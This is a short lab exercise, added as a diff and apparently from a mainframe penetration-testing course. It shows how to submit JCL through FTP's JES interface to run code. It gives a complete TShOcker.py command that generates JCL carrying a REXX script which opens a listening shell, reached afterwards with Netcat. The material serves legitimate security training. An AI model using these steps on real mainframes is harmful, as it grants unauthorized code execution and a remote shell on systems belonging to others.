@@ -1,0 +1,24 @@
+Lab 07: Use FTP to execute JCL
+
+- Connect to the mainframe with FTP
+- Issue the FTP command: SITE FILE=JES
+- Upload your JCL*
+- Download the job results
+
+This can be ANY JCL. Example JCL is available in the folder `Labs/Day 1/Lab 01/JCL`.
+
+Bonus: What other FTP commands are interesting?
+
+Using JCL and REXX and FTP Execute some code. You can use TShocker to make the JCL for you. It include a rexx script called 'CATSO.rexx'. Or feel free to write your own REXX script.
+
+TShOcker:
+
+./TShOcker.py -p PORT -l --lport "<choose a port>" --print IP USERNAME PASSWORD > ./JCL_REXX
+
+--print means 'Print the JCL'
+PORT = Mainframe Port
+--lport is the listening port you want
+IP = Mainframe IP/Hostname
+USERNAME/PASSWORD = Username and Password
+
+Then connect with Netcat on the port you selected for --lport
